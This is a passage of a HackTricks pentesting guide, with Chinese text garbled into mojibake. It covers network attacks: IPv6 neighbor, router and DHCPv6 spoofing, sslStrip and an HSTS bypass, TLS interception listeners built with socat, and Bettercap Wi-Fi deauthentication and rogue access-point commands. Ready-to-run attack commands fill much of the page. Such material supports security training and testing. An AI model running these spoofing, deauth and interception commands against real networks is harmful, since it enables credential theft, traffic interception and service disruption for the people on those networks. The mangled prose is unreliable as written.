<p>å·¥å…·Responderåˆ©ç”¨æ­¤åè®®ï¼Œå……å½“<strong>æ¶æ„WPADæœåŠ¡å™¨</strong>ã€‚å®ƒä½¿ç”¨DHCPã€DNSã€LLMNRå’ŒNBT-NSè¯¯å¯¼å®¢æˆ·ç«¯è¿æ¥åˆ°å®ƒã€‚è¦æ·±å…¥äº†è§£å¦‚ä½•ä½¿ç”¨Responderä¼ªè£…æœåŠ¡ï¼Œè¯·<a href="spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html">æŸ¥çœ‹æ­¤å¤„</a>ã€‚</p>
<h3 id="spoofing-ssdp-and-upnp-devices"><a class="header" href="#spoofing-ssdp-and-upnp-devices"><a href="spoofing-ssdp-and-upnp-devices.html">Spoofing SSDP and UPnP devices</a></a></h3>
<p>æ‚¨å¯ä»¥åœ¨ç½‘ç»œä¸­æä¾›ä¸åŒçš„æœåŠ¡ï¼Œä»¥å°è¯•<strong>æ¬ºéª—ç”¨æˆ·</strong>è¾“å…¥ä¸€äº›<strong>æ˜æ–‡å‡­æ®</strong>ã€‚<strong>æœ‰å…³æ­¤æ”»å‡»çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è§</strong><a href="spoofing-ssdp-and-upnp-devices.html"><strong>Spoofing SSDP and UPnP Devices</strong></a><strong>ã€‚</strong></p>
<h3 id="ipv6-neighbor-spoofing"><a class="header" href="#ipv6-neighbor-spoofing">IPv6 Neighbor Spoofing</a></h3>
<p>æ­¤æ”»å‡»ä¸ARPæ¬ºéª—éå¸¸ç›¸ä¼¼ï¼Œä½†åœ¨IPv6ç¯å¢ƒä¸­ã€‚æ‚¨å¯ä»¥è®©å—å®³è€…è®¤ä¸ºGWçš„IPv6å…·æœ‰æ”»å‡»è€…çš„MACã€‚</p>
<pre><code class="language-bash">sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 &lt;Router_IPv6&gt; #This option will send the Neighbor Advertisement packet every 2 seconds
</code></pre>
<h3 id="ipv6è·¯ç”±å™¨å¹¿å‘Šæ¬ºéª—æ´ªæ°´æ”»å‡»"><a class="header" href="#ipv6è·¯ç”±å™¨å¹¿å‘Šæ¬ºéª—æ´ªæ°´æ”»å‡»">IPv6è·¯ç”±å™¨å¹¿å‘Šæ¬ºéª—/æ´ªæ°´æ”»å‡»</a></h3>
<p>ä¸€äº›æ“ä½œç³»ç»Ÿé»˜è®¤é€šè¿‡ç½‘ç»œä¸­å‘é€çš„RAæ•°æ®åŒ…é…ç½®ç½‘å…³ã€‚è¦å°†æ”»å‡»è€…å£°æ˜ä¸ºIPv6è·¯ç”±å™¨ï¼Œå¯ä»¥ä½¿ç”¨ï¼š</p>
<pre><code class="language-bash">sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via &lt;ROUTER_IPv6&gt; dev wlan0
fake_router6 wlan0 fe80::01/16
</code></pre>
<h3 id="ipv6-dhcpæ¬ºéª—"><a class="header" href="#ipv6-dhcpæ¬ºéª—">IPv6 DHCPæ¬ºéª—</a></h3>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸€äº›æ“ä½œç³»ç»Ÿå°è¯•é€šè¿‡ç½‘ç»œä¸­çš„DHCPv6æ•°æ®åŒ…é…ç½®DNSã€‚ç„¶åï¼Œæ”»å‡»è€…å¯ä»¥å‘é€ä¸€ä¸ªDHCPv6æ•°æ®åŒ…ï¼Œå°†è‡ªå·±é…ç½®ä¸ºDNSã€‚DHCPè¿˜ä¸ºå—å®³è€…æä¾›äº†ä¸€ä¸ªIPv6åœ°å€ã€‚</p>
<pre><code class="language-bash">dhcp6.spoof on
dhcp6.spoof.domains &lt;list of domains&gt;

mitm6
</code></pre>
<h3 id="http-å‡é¡µé¢å’Œjsä»£ç æ³¨å…¥"><a class="header" href="#http-å‡é¡µé¢å’Œjsä»£ç æ³¨å…¥">HTTP (å‡é¡µé¢å’ŒJSä»£ç æ³¨å…¥)</a></h3>
<h2 id="äº’è”ç½‘æ”»å‡»"><a class="header" href="#äº’è”ç½‘æ”»å‡»">äº’è”ç½‘æ”»å‡»</a></h2>
<h3 id="sslstrip"><a class="header" href="#sslstrip">sslStrip</a></h3>
<p>åŸºæœ¬ä¸Šï¼Œè¿™ä¸ªæ”»å‡»çš„ä½œç”¨æ˜¯ï¼Œåœ¨<strong>ç”¨æˆ·</strong>å°è¯•<strong>è®¿é—®</strong>ä¸€ä¸ª<strong>HTTP</strong>é¡µé¢å¹¶<strong>é‡å®šå‘</strong>åˆ°<strong>HTTPS</strong>ç‰ˆæœ¬çš„æƒ…å†µä¸‹ï¼Œ<strong>sslStrip</strong>å°†<strong>ä¿æŒ</strong>ä¸<strong>å®¢æˆ·ç«¯çš„HTTPè¿æ¥</strong>å’Œä¸<strong>æœåŠ¡å™¨çš„HTTPSè¿æ¥</strong>ï¼Œè¿™æ ·å®ƒå°±èƒ½å¤Ÿä»¥<strong>æ˜æ–‡</strong>æ–¹å¼<strong>å—…æ¢</strong>è¿æ¥ã€‚</p>
<pre><code class="language-bash">apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
</code></pre>
<p>æ›´å¤šä¿¡æ¯ <a href="https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf">è¿™é‡Œ</a>ã€‚</p>
<h3 id="sslstrip-å’Œ-dns2proxy-ç»•è¿‡-hsts"><a class="header" href="#sslstrip-å’Œ-dns2proxy-ç»•è¿‡-hsts">sslStrip+ å’Œ dns2proxy ç»•è¿‡ HSTS</a></h3>
<p><strong>sslStrip+ å’Œ dns2proxy</strong> ä¸ <strong>sslStrip</strong> çš„<strong>åŒºåˆ«</strong>åœ¨äºå®ƒä»¬ä¼š<strong>é‡å®šå‘</strong>ä¾‹å¦‚ <em><strong>www.facebook.com</strong></em> <strong>åˆ°</strong> <em><strong>wwww.facebook.com</strong></em>ï¼ˆæ³¨æ„<strong>å¤šå‡ºçš„</strong>â€œ<strong>w</strong>â€ï¼‰ï¼Œå¹¶å°†<strong>è¯¥åŸŸåçš„åœ°å€è®¾ç½®ä¸ºæ”»å‡»è€… IP</strong>ã€‚è¿™æ ·ï¼Œ<strong>å®¢æˆ·ç«¯</strong>å°†<strong>è¿æ¥</strong>åˆ° <em><strong>wwww.facebook.com</strong></em> <strong>ï¼ˆæ”»å‡»è€…ï¼‰</strong>ï¼Œä½†åœ¨åå°<strong>sslstrip+<strong>å°†</strong>é€šè¿‡ https ç»´æŠ¤</strong>ä¸ <strong>www.facebook.com</strong> çš„<strong>çœŸå®è¿æ¥</strong>ã€‚</p>
<p>æ­¤æŠ€æœ¯çš„<strong>ç›®æ ‡</strong>æ˜¯<strong>é¿å… HSTS</strong>ï¼Œå› ä¸º <em><strong>wwww</strong>.facebook.com</em> <strong>ä¸ä¼š</strong>è¢«ä¿å­˜åœ¨<strong>æµè§ˆå™¨çš„ç¼“å­˜</strong>ä¸­ï¼Œå› æ­¤æµè§ˆå™¨ä¼šè¢«æ¬ºéª—ä»¥åœ¨ HTTP ä¸­æ‰§è¡Œ<strong>facebook è®¤è¯</strong>ã€‚<br />
è¯·æ³¨æ„ï¼Œä¸ºäº†æ‰§è¡Œæ­¤æ”»å‡»ï¼Œå—å®³è€…å¿…é¡»æœ€åˆå°è¯•è®¿é—® <a href="http://www.faceook.com">http://www.faceook.com</a>ï¼Œè€Œä¸æ˜¯ httpsã€‚è¿™å¯ä»¥é€šè¿‡ä¿®æ”¹ http é¡µé¢ä¸­çš„é“¾æ¥æ¥å®ç°ã€‚</p>
<p>æ›´å¤šä¿¡æ¯ <a href="https://www.bettercap.org/legacy/#hsts-bypass">è¿™é‡Œ</a>ï¼Œ<a href="https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014">è¿™é‡Œ</a> å’Œ <a href="https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly">è¿™é‡Œ</a>ã€‚</p>
<p><strong>sslStrip æˆ– sslStrip+ ä¸å†æœ‰æ•ˆã€‚è¿™æ˜¯å› ä¸ºæµè§ˆå™¨ä¸­é¢„å…ˆä¿å­˜äº† HSTS è§„åˆ™ï¼Œå› æ­¤å³ä½¿ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®â€œé‡è¦â€åŸŸåï¼Œä»–ä¹Ÿä¼šé€šè¿‡ HTTPS è®¿é—®ã€‚æ­¤å¤–ï¼Œè¯·æ³¨æ„ï¼Œé¢„å…ˆä¿å­˜çš„è§„åˆ™å’Œå…¶ä»–ç”Ÿæˆçš„è§„åˆ™å¯ä»¥ä½¿ç”¨æ ‡å¿—</strong> <a href="https://hstspreload.appspot.com"><strong><code>includeSubdomains</code></strong></a> **ï¼Œå› æ­¤ä¹‹å‰çš„ <em><strong>wwww.facebook.com</strong></em> <strong>ç¤ºä¾‹å°†ä¸å†æœ‰æ•ˆï¼Œå› ä¸º</strong> <em><strong>facebook.com</strong></em> <strong>ä½¿ç”¨ HSTS å’Œ <code>includeSubdomains</code>ã€‚</strong></p>
<p>TODO: easy-creds, evilgrade, metasploit, factory</p>
<h2 id="tcp-ç›‘å¬ç«¯å£"><a class="header" href="#tcp-ç›‘å¬ç«¯å£">TCP ç›‘å¬ç«¯å£</a></h2>
<pre><code class="language-bash">sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
</code></pre>
<h2 id="tcp--ssl-åœ¨ç«¯å£ç›‘å¬"><a class="header" href="#tcp--ssl-åœ¨ç«¯å£ç›‘å¬">TCP + SSL åœ¨ç«¯å£ç›‘å¬</a></h2>
<h4 id="ç”Ÿæˆå¯†é’¥å’Œè‡ªç­¾åè¯ä¹¦"><a class="header" href="#ç”Ÿæˆå¯†é’¥å’Œè‡ªç­¾åè¯ä¹¦">ç”Ÿæˆå¯†é’¥å’Œè‡ªç­¾åè¯ä¹¦</a></h4>
<pre><code>FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt &gt;$FILENAME.pem
</code></pre>
<h4 id="ä½¿ç”¨è¯ä¹¦è¿›è¡Œç›‘å¬"><a class="header" href="#ä½¿ç”¨è¯ä¹¦è¿›è¡Œç›‘å¬">ä½¿ç”¨è¯ä¹¦è¿›è¡Œç›‘å¬</a></h4>
<pre><code>sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
</code></pre>
<h4 id="ä½¿ç”¨è¯ä¹¦ç›‘å¬å¹¶é‡å®šå‘åˆ°ä¸»æœº"><a class="header" href="#ä½¿ç”¨è¯ä¹¦ç›‘å¬å¹¶é‡å®šå‘åˆ°ä¸»æœº">ä½¿ç”¨è¯ä¹¦ç›‘å¬å¹¶é‡å®šå‘åˆ°ä¸»æœº</a></h4>
<pre><code>sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
</code></pre>
<p>æœ‰æ—¶ï¼Œå¦‚æœå®¢æˆ·ç«¯æ£€æŸ¥CAæ˜¯å¦æœ‰æ•ˆï¼Œæ‚¨å¯ä»¥<strong>æä¾›ç”±CAç­¾ç½²çš„å…¶ä»–ä¸»æœºåçš„è¯ä¹¦</strong>ã€‚<br />
å¦ä¸€ä¸ªæœ‰è¶£çš„æµ‹è¯•æ˜¯<strong>æä¾›è¯·æ±‚çš„ä¸»æœºåçš„è‡ªç­¾åè¯ä¹¦</strong>ã€‚</p>
<p>å…¶ä»–æµ‹è¯•å†…å®¹æ˜¯å°è¯•ç”¨ä¸€ä¸ªæœ‰æ•ˆçš„è¯ä¹¦ç­¾ç½²è¯¥è¯ä¹¦ï¼Œä½†è¯¥è¯ä¹¦å¹¶ä¸æ˜¯æœ‰æ•ˆçš„CAã€‚æˆ–è€…ä½¿ç”¨æœ‰æ•ˆçš„å…¬é’¥ï¼Œå¼ºåˆ¶ä½¿ç”¨ä¸€ç§ç®—æ³•ï¼Œå¦‚Diffie-Hellmanï¼ˆä¸éœ€è¦ç”¨çœŸå®ç§é’¥è§£å¯†çš„ç®—æ³•ï¼‰ï¼Œå½“å®¢æˆ·ç«¯è¯·æ±‚çœŸå®ç§é’¥çš„æ¢æµ‹ï¼ˆå¦‚å“ˆå¸Œï¼‰æ—¶ï¼Œå‘é€ä¸€ä¸ªå‡æ¢æµ‹ï¼Œå¹¶æœŸæœ›å®¢æˆ·ç«¯ä¸æ£€æŸ¥è¿™ä¸ªã€‚</p>
<h2 id="bettercap-2"><a class="header" href="#bettercap-2">Bettercap</a></h2>
<pre><code class="language-bash"># Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
</code></pre>
<h3 id="active-discovery-notes"><a class="header" href="#active-discovery-notes">Active Discovery Notes</a></h3>
<p>è¯·æ³¨æ„ï¼Œå½“UDPæ•°æ®åŒ…å‘é€åˆ°æ²¡æœ‰è¯·æ±‚ç«¯å£çš„è®¾å¤‡æ—¶ï¼Œä¼šå‘é€ä¸€ä¸ªICMPï¼ˆç«¯å£ä¸å¯è¾¾ï¼‰æ¶ˆæ¯ã€‚</p>
<h3 id="arp-discover"><a class="header" href="#arp-discover"><strong>ARP discover</strong></a></h3>
<p>ARPæ•°æ®åŒ…ç”¨äºå‘ç°ç½‘ç»œä¸­æ­£åœ¨ä½¿ç”¨çš„IPã€‚PCå¿…é¡»ä¸ºæ¯ä¸ªå¯èƒ½çš„IPåœ°å€å‘é€è¯·æ±‚ï¼Œåªæœ‰æ­£åœ¨ä½¿ç”¨çš„IPæ‰ä¼šå“åº”ã€‚</p>
<h3 id="mdns-multicast-dns"><a class="header" href="#mdns-multicast-dns"><strong>mDNS (multicast DNS)</strong></a></h3>
<p>Bettercapæ¯éš”Xæ¯«ç§’å‘é€ä¸€ä¸ªMDNSè¯·æ±‚ï¼Œè¯¢é—®**_services_.dns-sd._udp.local**ï¼Œçœ‹åˆ°è¿™ä¸ªæ•°æ®åŒ…çš„æœºå™¨é€šå¸¸ä¼šå›ç­”è¿™ä¸ªè¯·æ±‚ã€‚ç„¶åï¼Œå®ƒåªæœç´¢å›ç­”â€œservicesâ€çš„æœºå™¨ã€‚</p>
<p><strong>Tools</strong></p>
<ul>
<li>Avahi-browser (--all)</li>
<li>Bettercap (net.probe.mdns)</li>
<li>Responder</li>
</ul>
<h3 id="nbns-netbios-name-server"><a class="header" href="#nbns-netbios-name-server"><strong>NBNS (NetBios Name Server)</strong></a></h3>
<p>Bettercapå¹¿æ’­æ•°æ®åŒ…åˆ°ç«¯å£137/UDPï¼Œè¯¢é—®åç§°â€œCKAAAAAAAAAAAAAAAAAAAAAAAAAAAâ€ã€‚</p>
<h3 id="ssdp-simple-service-discovery-protocol"><a class="header" href="#ssdp-simple-service-discovery-protocol"><strong>SSDP (Simple Service Discovery Protocol)</strong></a></h3>
<p>Bettercapå¹¿æ’­SSDPæ•°æ®åŒ…ï¼Œæœç´¢å„ç§æœåŠ¡ï¼ˆUDPç«¯å£1900ï¼‰ã€‚</p>
<h3 id="wsd-web-service-discovery"><a class="header" href="#wsd-web-service-discovery"><strong>WSD (Web Service Discovery)</strong></a></h3>
<p>Bettercapå¹¿æ’­WSDæ•°æ®åŒ…ï¼Œæœç´¢æœåŠ¡ï¼ˆUDPç«¯å£3702ï¼‰ã€‚</p>
<h2 id="references"><a class="header" href="#references">References</a></h2>
<ul>
<li><a href="https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9">https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9</a></li>
<li><strong>Network Security Assessment: Know Your Network (3rd edition)</strong></li>
<li><strong>Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood</strong></li>
<li><a href="https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9">https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9</a></li>
</ul>
<p><img src="../../.gitbook/assets/i3.png" alt="" data-size="original"><br />
<strong>Bug bounty tip</strong>: <strong>sign up</strong> for <strong>Intigriti</strong>, a premium <strong>bug bounty platform created by hackers, for hackers</strong>! Join us at <a href="https://go.intigriti.com/hacktricks"><strong>https://go.intigriti.com/hacktricks</strong></a> today, and start earning bounties up to <strong>$100,000</strong>!</p>
<p>{% embed url="https://go.intigriti.com/hacktricks" %}</p>
<p>{% hint style="success" %}
Learn &amp; practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
Learn &amp; practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>Support HackTricks</summary>
<ul>
<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
<li><strong>Join the</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../generic-methodologies-and-resources/pentesting-network/dhcpv6.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../generic-methodologies-and-resources/pentesting-network/dhcpv6.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
